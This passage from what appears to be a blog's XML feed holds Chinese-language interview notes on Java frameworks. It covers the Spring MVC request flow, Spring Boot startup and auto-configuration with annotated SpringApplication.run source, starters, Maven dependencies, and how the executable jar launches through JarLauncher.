        <content type="html"><![CDATA[<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="/./2024/05/26/Springmvc%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/1.png" alt="流程图"></p><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><ol><li><strong>用户发送请求至前端控制器DispatcherServlet</strong><ol><li>DispatcherServlet：前端控制器。用户请求到达前端控制器，它就相当于mvc模式中的c，dispatcherServlet是整个流程控制的中心，由它调用其它组件处理用户的请求，dispatcherServlet的存在降低了组件之间的耦合性,系统扩展性提高。由框架实现</li><li>doService doDispatch(request, response);</li></ol></li><li><strong>DispatcherServlet收到请求调用处理器映射器HandlerMapping</strong><ol><li>HandlerMapping：处理器映射器。HandlerMapping负责根据用户请求的url找到Handler即处理器，springmvc提供了不同的映射器实现不同的映射方式，根据一定的规则去查找,例如：xml配置方式，实现接口方式，注解方式等。由框架实现</li></ol></li><li><strong>处理器映射器根据请求url找到具体的处理器，生成处理器执行链HandlerExecutionChain(包括处理器对象和处理器拦截器)一并返回给DispatcherServlet</strong></li><li><strong>DispatcherServlet根据处理器Handler获取处理器适配器HandlerAdapter执行HandlerAdapter处理一系列的操作，如：参数封装，数据格式转换，数据验证等操作</strong><ol><li>Handler：处理器。Handler 是继DispatcherServlet前端控制器的后端控制器，在DispatcherServlet的控制下Handler对具体的用户请求进行处理。由于Handler涉及到具体的用户业务请求，所以一般情况需要程序员根据业务需求开发Handler。</li><li>将http报文转换为对象<ol><li>HttpMessageConverter接口<ol><li><code>canRead</code> http-&gt;object</li><li><code>canWrite</code> 对象的序列化输出</li></ol></li><li>HttpMessageConverter有很多的实现类，根据HTTP协议的Accept和Content-Type属性，以及参数数据类型来判别使用哪一种HttpMessageConverter</li></ol></li></ol></li><li><strong>执行处理器Handler(Controller，也叫页面控制器)</strong></li><li><strong>Handler执行完成返回ModelAndView</strong></li><li><strong>HandlerAdapter将Handler执行结果ModelAndView返回到DispatcherServlet</strong><ol><li>HandlAdapter：处理器适配器。通过HandlerAdapter对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。由框架实现。</li></ol></li><li><strong>DispatcherServlet将ModelAndView传给ViewReslover视图解析器</strong><ol><li>ModelAndView是springmvc的封装对象，将model和view封装在一起</li></ol></li><li><strong>ViewReslover解析后返回具体View</strong><ol><li>ViewResolver：视图解析器。ViewResolver负责将处理结果生成View视图，ViewResolver首先根据逻辑视图名解析成物理视图名即具体的页面地址，再生成View视图对象，最后对View进行渲染将处理结果通过页面展示给用户</li></ol></li><li><strong>DispatcherServlet对View进行渲染视图（即将模型数据model填充至视图中）</strong><ol><li>View:是springmvc的封装对象，是一个接口, springmvc框架提供了很多的View视图类型，包括：jspview，pdfview,jstlView、freemarkerView、pdfView等。一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面。</li></ol></li><li><strong>DispatcherServlet响应用户</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springmvc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Springboot最热点面试题</title>
      
      <link href="/2024/05/26/Springboot%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2024/05/26/Springboot%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="springboot启动流程"><a href="#springboot启动流程" class="headerlink" title="springboot启动流程"></a>springboot启动流程</h2><h3 id="启动类上注解：-SpringBootApplication"><a href="#启动类上注解：-SpringBootApplication" class="headerlink" title="启动类上注解：@SpringBootApplication"></a>启动类上注解：@SpringBootApplication</h3><h4 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h4><p>根据Javadoc可知，该注解作用就是将当前的类作为一个JavaConfig，然后触发注解@EnableAutoConfiguration和@ComponentScan的处理，本质上与@Configuration注解没有区别</p><h4 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h4><p>@EnableAutoConfiguration:实现自动装配的核心注解</p><ul><li>@AutoConfigurationPackage<ul><li>注册当前启动类的根 package</li><li>注册 org.springframework.boot.autoconfigure.AutoConfigurationPackages 的 BeanDefinition</li></ul></li><li>@Import(AutoConfigurationImportSelector.class)<ul><li>自动装配核心功能的实现实际是通过 AutoConfigurationImportSelector(加载自动装配类)类</li><li>AutoConfigurationImportSelector 类实现了 ImportSelector接口<ul><li>实现了这个接口中的 selectImports方法<ul><li>方法实现 重要的getAutoConfigurationEntry()方法<ol><li>判断自动装配是否打开，默认是true可以通过application.yml设置</li><li>获取@EnableAutoConfiguration里的exclude和excludeName内容以便排除</li><li>获取需要自动装配的所有配置类，读取META-INF&#x2F;spring.factories druid 数据库连接池的 Spring Boot Starter 就创建了META-INF&#x2F;spring.factories文件</li><li>筛选满足@ConditionalOnXXX注解的类，生效才会被加载</li></ol></li><li>该方法主要用于获取所有符合条件的类的全限定类名，这些类需要被加载到 IoC 容器中</li></ul></li></ul></li></ul></li></ul><h4 id="ComponentScan"><a href="#ComponentScan" class="headerlink" title="@ComponentScan"></a>@ComponentScan</h4><p>扫描的 Spring 对应的组件，如 @Componet，@Repository</p><ul><li>我们可以通过 basePackages 等属性来细粒度的定制 @ComponentScan 自动扫描的范围，如果不指定，则默认Spring框架实现会从声明 @ComponentScan 所在类的package进行扫描，所以 SpringBoot 的启动类最好是放在根package下，我们自定义的类就放在对应的子package下，这样就可以不指定 basePackages</li></ul><h3 id="启动类中的main方法：org-springframework-boot-SpringApplication-run-java-lang-Class-java-lang-String…"><a href="#启动类中的main方法：org-springframework-boot-SpringApplication-run-java-lang-Class-java-lang-String…" class="headerlink" title="启动类中的main方法：org.springframework.boot.SpringApplication#run(java.lang.Class&lt;?&gt;, java.lang.String…)"></a>启动类中的main方法：org.springframework.boot.SpringApplication#run(java.lang.Class&lt;?&gt;, java.lang.String…)</h3><ul><li>从spring.factories配置文件中加载EventPublishingRunListener对象，该对象拥有SimpleApplicationEventMulticaster属性，即在SpringBoot启动过程的不同阶段用来发射内置的生命周期事件;<ul><li>spring-bean包下META-INF&#x2F;spring.factories</li></ul></li><li>准备环境变量，包括系统变量，环境变量，命令行参数，默认变量，servlet相关配置变量，随机值以及配置文件（比如application.properties）等;<ul><li>而后就会去创建Environment——这个时候会去加载application配置文件</li></ul></li><li>控制台打印SpringBoot的bannner标志；</li><li>根据不同类型环境创建不同类型的applicationcontext容器，因为这里是servlet环境，所以创建的是AnnotationConfigServletWebServerApplicationContext容器对象；</li><li>从spring.factories配置文件中加载FailureAnalyzers对象,用来报告SpringBoot启动过程中的异常；</li><li>为刚创建的容器对象做一些初始化工作，准备一些容器属性值等，对ApplicationContext应用一些相关的后置处理和调用各个ApplicationContextInitializer的初始化方法来执行一些初始化逻辑等；</li><li>刷新容器，这一步至关重要。比如调用bean factory的后置处理器，注册BeanPostProcessor后置处理器，初始化事件广播器且广播事件，初始化剩下的单例bean和SpringBoot创建内嵌的Tomcat服务器等等重要且复杂的逻辑都在这里实现，主要步骤可见代码的注释，关于这里的逻辑会在以后的spring源码分析专题详细分析；<ul><li>&#x2F;&#x2F; 1）在context刷新前做一些准备工作，比如初始化一些属性设置，属性合法性校验和保存容器中的一些早期事件等；</li><li>&#x2F;&#x2F; 2）让子类刷新其内部bean factory,注意SpringBoot和Spring启动的情况执行逻辑不一样</li><li>&#x2F;&#x2F; 3）对bean factory进行配置，比如配置bean factory的类加载器，后置处理器等</li><li>&#x2F;&#x2F; 4）完成bean factory的准备工作后，此时执行一些后置处理逻辑，子类通过重写这个方法来在BeanFactory创建并预准备完成以后做进一步的设置<ul><li>&#x2F;&#x2F; 在这一步，所有的bean definitions将会被加载，但此时bean还不会被实例化</li></ul></li><li>&#x2F;&#x2F; 5）执行BeanFactoryPostProcessor的方法即调用bean factory的后置处理器：<ul><li>&#x2F;&#x2F; BeanDefinitionRegistryPostProcessor（触发时机：bean定义注册之前）和BeanFactoryPostProcessor（触发时机：bean定义注册之后bean实例化之前）</li></ul></li><li>&#x2F;&#x2F; 6）注册bean的后置处理器BeanPostProcessor，注意不同接口类型的BeanPostProcessor；在Bean创建前后的执行时机是不一样的</li><li>&#x2F;&#x2F; 7）初始化国际化MessageSource相关的组件，比如消息绑定，消息解析等</li><li>&#x2F;&#x2F; 8）初始化事件广播器，如果bean factory没有包含事件广播器，那么new一个SimpleApplicationEventMulticaster广播器对象并注册到bean factory中</li><li>&#x2F;&#x2F; 9）AbstractApplicationContext定义了一个模板方法onRefresh，留给子类覆写，比如ServletWebServerApplicationContext覆写了该方法来创建内嵌的tomcat容器</li><li>&#x2F;&#x2F; 10）注册实现了ApplicationListener接口的监听器，之前已经有了事件广播器，此时就可以派发一些early application events</li><li>&#x2F;&#x2F; 11）完成容器bean factory的初始化，并初始化所有剩余的单例bean。这一步非常重要，一些bean postprocessor会在这里调用。</li><li>&#x2F;&#x2F; 12）完成容器的刷新工作，并且调用生命周期处理器的onRefresh()方法，并且发布ContextRefreshedEvent事件</li></ul></li><li>执行刷新容器后的后置处理逻辑，注意这里为空方法；</li><li>调用ApplicationRunner和CommandLineRunner的run方法，我们实现这两个接口可以在spring容器启动后需要的一些东西比如加载一些业务数据等;</li><li>报告启动异常，即若启动过程中抛出异常，此时用FailureAnalyzers来报告异常;</li><li>最终返回容器对象，这里调用方法没有声明对象来接收。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   SpringApplication.run(<span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[<span class="number">0</span>], args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ConfigurableApplicationContext <span class="title function_">run</span><span class="params">(Class&lt;?&gt;[] primarySources, String[] args)</span> &#123;</span><br><span class="line">   <span class="comment">// 新建SpringApplication对象，再调用run方法</span></span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SpringApplication</span>(primarySources).run(args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title function_">run</span><span class="params">(String... args)</span> &#123;</span><br><span class="line">   <span class="comment">// stopWatch用于统计run启动过程时长</span></span><br><span class="line">   <span class="type">StopWatch</span> <span class="variable">stopWatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StopWatch</span>();</span><br><span class="line">   <span class="comment">// 开始计时</span></span><br><span class="line">   stopWatch.start();</span><br><span class="line">   <span class="comment">// 创建ConfigurableApplicationContext对象</span></span><br><span class="line">   <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="comment">// exceptionReporters集合用来存储SpringApplication启动过程的异常，SpringBootExceptionReporter且通过spring.factories方式来加载</span></span><br><span class="line">   Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">   <span class="comment">// 配置headless属性</span></span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 从spring.factories配置文件中加载到EventPublishingRunListener对象并赋值给SpringApplicationRunListeners</span></span><br><span class="line"><span class="comment">    * # Run Listeners</span></span><br><span class="line"><span class="comment">    * org.springframework.boot.SpringApplicationRunListener=\</span></span><br><span class="line"><span class="comment">    * org.springframework.boot.context.event.EventPublishingRunListener</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="type">SpringApplicationRunListeners</span> <span class="variable">listeners</span> <span class="operator">=</span> getRunListeners(args);</span><br><span class="line">   <span class="comment">// 启动SpringApplicationRunListeners监听</span></span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 创建ApplicationArguments对象，封装了args参数</span></span><br><span class="line">      <span class="type">ApplicationArguments</span> <span class="variable">applicationArguments</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultApplicationArguments</span>(args);</span><br><span class="line">      <span class="comment">// 备配置参数有app.properties，外部配置参数比如jvm启动参数等</span></span><br><span class="line">      <span class="type">ConfigurableEnvironment</span> <span class="variable">environment</span> <span class="operator">=</span> prepareEnvironment(listeners, applicationArguments);</span><br><span class="line">      <span class="comment">// 配置spring.beaninfo.ignore属性</span></span><br><span class="line">      configureIgnoreBeanInfo(environment);</span><br><span class="line">      <span class="comment">// 打印springboot的bannner</span></span><br><span class="line">      <span class="type">Banner</span> <span class="variable">printedBanner</span> <span class="operator">=</span> printBanner(environment);</span><br><span class="line">      <span class="comment">// 根据不同类型创建不同类型的spring applicationcontext容器</span></span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">      <span class="comment">/**</span></span><br><span class="line"><span class="comment">       * 异常报告</span></span><br><span class="line"><span class="comment">       * 从spring.factories配置文件中加载exceptionReporters，其中ConfigurableApplicationContext.class作为FailureAnalyzers构造方法的参数</span></span><br><span class="line"><span class="comment">       * # Error Reporters</span></span><br><span class="line"><span class="comment">       * org.springframework.boot.SpringBootExceptionReporter=\</span></span><br><span class="line"><span class="comment">       * org.springframework.boot.diagnostics.FailureAnalyzers</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      exceptionReporters = getSpringFactoriesInstances(SpringBootExceptionReporter.class,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; ConfigurableApplicationContext.class &#125;, context);</span><br><span class="line">      <span class="comment">// 准备容器事项：调用各个ApplicationContextInitializer的initialize方法</span></span><br><span class="line">      <span class="comment">// 和触发SpringApplicationRunListeners的contextPrepared及contextLoaded方法等</span></span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments, printedBanner);</span><br><span class="line">      <span class="comment">// 刷新容器，这一步至关重要</span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">      <span class="comment">// 执行刷新容器后的后置处理逻辑，注意这里为空方法</span></span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">      <span class="comment">// 停止stopWatch计时</span></span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="comment">// 打印springboot的启动时常</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.logStartupInfo) &#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">StartupInfoLogger</span>(<span class="built_in">this</span>.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 触发SpringApplicationRunListener的started方法，通知spring容器已经启动</span></span><br><span class="line">      listeners.started(context);</span><br><span class="line">      <span class="comment">// 调用ApplicationRunner和CommandLineRunner的run方法，实现spring容器启动后需要做的一些东西</span></span><br><span class="line">      callRunners(context, applicationArguments);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。</span></span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      handleRunFailure(context, ex, exceptionReporters, listeners);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(ex);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 当容器刷新完毕等，触发SpringApplicationRunListeners数组的running方法</span></span><br><span class="line">      listeners.running(context);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      <span class="comment">// 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。</span></span><br><span class="line">      handleRunFailure(context, ex, exceptionReporters, <span class="literal">null</span>);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(ex);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> context;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="怎么让Spring把Body变成一个对象"><a href="#怎么让Spring把Body变成一个对象" class="headerlink" title="怎么让Spring把Body变成一个对象"></a>怎么让Spring把Body变成一个对象</h2><ul><li>@RequestBody注解原理</li><li>详细看springmvc的处理流程</li></ul><h2 id="SpringBoot的starter实现原理是什么？"><a href="#SpringBoot的starter实现原理是什么？" class="headerlink" title="SpringBoot的starter实现原理是什么？"></a>SpringBoot的starter实现原理是什么？</h2><p>原理就是因为在@EnableAutoConfiguration注解，会自动的扫描jar包下的META-INF&#x2F;spring.factories文件的配置类，写在这里面的类都是需要被自动加载的</p><p>将configuration类中定义的bean加入spring到容器中。就相当于加载之前我们自己配置组件的xml文件。而现在SpringBoot自己定义了一个默认的值，然后直接加载进入了Spring容器。</p><p>SpringBoot提供的自动配置依赖模块都以spring-boot-starter-为命名前缀，并且这些依赖都在org.springframework.boot下。 所有的spring-boot-starter都有约定俗成的默认配置，但允许调整这些配置调整默认的行为。</p><h2 id="spring-和springboot的区别"><a href="#spring-和springboot的区别" class="headerlink" title="spring 和springboot的区别"></a>spring 和springboot的区别</h2><p>Spring Boot基本上是Spring框架的扩展，它消除了设置Spring应用程序所需的XML配置，为更快，更高效的开发生态系统铺平了道路。</p><p>Spring Boot中的一些特征：</p><ul><li>创建独立的Spring应用。</li><li>嵌入式Tomcat、Jetty、 Undertow容器（无需部署war文件）。</li><li>提供的starters 简化构建配置</li><li>尽可能自动配置spring应用。</li><li>提供生产指标,例如指标、健壮检查和外部化配置</li><li>完全没有代码生成和XML配置要求</li></ul><p>Maven依赖</p><p>首先，让我们看一下使用Spring创建Web应用程序所需的最小依赖项</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>与Spring不同，Spring Boot只需要一个依赖项来启动和运行Web应用程序：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在进行构建期间，所有其他依赖项将自动添加到项目中。</p><p>另一个很好的例子就是测试库。我们通常使用Spring Test，JUnit，Hamcrest和Mockito库。在Spring项目中，我们应该将所有这些库添加为依赖项。但是在Spring Boot中，我们只需要添加spring-boot-starter-test依赖项来自动包含这些库。</p><p>spring在运行前需要使用xml文件做很多配置，而springboot帮我们实现了这些配置的自动加载，基于注解和简单的yml配置即可</p><p>spring的web程序还是打包为war然后再Tomcat里运行，而springboot内嵌了Tomcat直接打成可运行的jar</p><h2 id="Spring-Boot-可执行-Jar-包运行原理"><a href="#Spring-Boot-可执行-Jar-包运行原理" class="headerlink" title="Spring Boot 可执行 Jar 包运行原理"></a>Spring Boot 可执行 Jar 包运行原理</h2><p>Spring Boot 有一个很方便的功能就是可以将应用打成可执行的 Jar。那么大家有没想过这个 Jar 是怎么运行起来的呢？本篇博客就来介绍下 Spring Boot 可执行 Jar 包的运行原理。</p><h3 id="打可执行-Jar-包"><a href="#打可执行-Jar-包" class="headerlink" title="打可执行 Jar 包"></a>打可执行 Jar 包</h3><p>将 Spring Boot 应用打成可执行 Jar包很容易，只需要在 pom 中加上一个 Spring Boot 提供的插件，然后在执行mvn package即可</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行完mvn package后，我们会在 target 目录下看到两个 jar 文件。myproject-0.0.1-SNAPSHOT.jar 和 myproject-0.0.1-SNAPSHOT.jar.original。第一个 jar 文件就是我们应用的可执行 jar 包，第二个 Jar 文件是应用原始的 jar 包。</p><h3 id="可执行-Jar-包内部结构"><a href="#可执行-Jar-包内部结构" class="headerlink" title="可执行 Jar 包内部结构"></a>可执行 Jar 包内部结构</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">可执行 jar 目录结构</span><br><span class="line">├─BOOT-INF</span><br><span class="line">│  ├─classes</span><br><span class="line">│  └─lib</span><br><span class="line">├─META-INF</span><br><span class="line">│  ├─maven</span><br><span class="line">│  ├─app.properties</span><br><span class="line">│  ├─MANIFEST.MF      </span><br><span class="line">└─org</span><br><span class="line">    └─springframework</span><br><span class="line">        └─boot</span><br><span class="line">            └─loader</span><br><span class="line">                ├─archive</span><br><span class="line">                ├─data</span><br><span class="line">                ├─jar</span><br><span class="line">                └─util</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们先来重点关注两个地方：META-INF 下面的 Jar 包描述文件和 BOOT-INF 这个目录。</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">Manifest-Version</span>: <span class="string">1.0</span></span><br><span class="line"><span class="attr">Archiver-Version</span>: <span class="string">Plexus Archiver</span></span><br><span class="line"><span class="attr">Built-By</span>: <span class="string">xxxx</span></span><br><span class="line"><span class="attr">Start-Class</span>: <span class="string">com.xxxx.AppServer</span></span><br><span class="line"><span class="attr">Spring-Boot-Classes</span>: <span class="string">BOOT-INF/classes/</span></span><br><span class="line"><span class="attr">Spring-Boot-Lib</span>: <span class="string">BOOT-INF/lib/</span></span><br><span class="line"><span class="attr">Spring-Boot-Version</span>: <span class="string">2.1.6.RELEASE</span></span><br><span class="line"><span class="attr">Created-By</span>: <span class="string">Apache Maven 3.3.9</span></span><br><span class="line"><span class="attr">Build-Jdk</span>: <span class="string">1.8.0_73</span></span><br><span class="line"><span class="attr">Main-Class</span>: <span class="string">org.springframework.boot.loader.JarLauncher</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上面我们看到一个熟悉的配置Main-Class: org.springframework.boot.loader.JarLauncher。我们大概能猜到这个类是整个系统的入口。</p><p>再看下 BOOT-INF 这个目录下面，我们会发现里面是我们项目打出来的 class 文件和项目依赖的 Jar 包。看到这里，你可能已经猜到 Spring Boot 是怎么启动项目的了。</p><h3 id="JarLauncher"><a href="#JarLauncher" class="headerlink" title="JarLauncher"></a>JarLauncher</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JarLauncher</span> <span class="keyword">extends</span> <span class="title class_">ExecutableArchiveLauncher</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BOOT_INF_CLASSES</span> <span class="operator">=</span> <span class="string">&quot;BOOT-INF/classes/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BOOT_INF_LIB</span> <span class="operator">=</span> <span class="string">&quot;BOOT-INF/lib/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">JarLauncher</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">JarLauncher</span><span class="params">(Archive archive)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>(archive);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isNestedArchive</span><span class="params">(Archive.Entry entry)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (entry.isDirectory()) &#123;</span><br><span class="line"><span class="keyword">return</span> entry.getName().equals(BOOT_INF_CLASSES);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> entry.getName().startsWith(BOOT_INF_LIB);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//项目入口，重点在launch这个方法中</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">JarLauncher</span>().launch(args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//launch方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">launch</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    JarFile.registerUrlProtocolHandler();</span><br><span class="line">    <span class="comment">//创建LaunchedURLClassLoader。如果根类加载器和扩展类加载器没有加载到某个类的话，就会通过LaunchedURLClassLoader这个加载器来加载类。这个加载器会从Boot-INF下面的class目录和lib目录下加载类。</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> createClassLoader(getClassPathArchives());</span><br><span class="line">    <span class="comment">//这个方法会读取jar描述文件中的Start-Class属性，然后通过反射调用到这个类的main方法。</span></span><br><span class="line">    launch(args, getMainClass(), classLoader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单总结</p><ul><li>Spring Boot 可执行 Jar 包的入口点是 JarLauncher 的 main 方法；</li><li>这个方法的执行逻辑是先创建一个 LaunchedURLClassLoader，这个加载器加载类的逻辑是：先判断根类加载器和扩展类加载器能否加载到某个类，如果都加载不到就从 Boot-INF 下面的 class 和 lib 目录下去加载；</li><li>读取Start-Class属性，通过反射机制调用启动类的 main 方法，这样就顺利调用到我们开发的 Spring Boot 主启动类的 main 方法了。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Spring最热点面试题</title>
      
      <link href="/2024/05/26/Spring%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2024/05/26/Spring%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
